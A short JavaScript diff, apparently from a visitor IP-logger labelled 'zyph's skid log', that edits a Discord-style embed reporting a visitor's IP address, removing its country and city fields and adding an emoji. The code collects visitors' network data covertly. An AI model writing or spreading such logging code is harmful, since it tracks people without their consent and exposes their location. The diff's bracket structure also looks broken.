@@ -5,15 +5,8 @@ function noskidz(ipData) {
       title: 'zyph's skid log',
       url: 'https://zyph.nl/',
       fields: [{
-        name: 'IP:',
+        name: 'IP 🖥:',
         value: ipData.ip || 'Unknown',
-      }, {
-        name: 'Country:',
-        value: ipData.country || 'Unknown',
-      }, {
-        name: 'City:',
-        value: ipData.city || 'Unknown',
-      }],
     }],
     	image: {
 		url: 'https://cdn.discordapp.com/attachments/1192845303989158058/1192850002905681930/snapchat.gif?ex=65aa9322&is=65981e22&hm=80cba2ea21bbd99cc5196279c871714744b7e772b837e64a5594c00678bf6db3&',
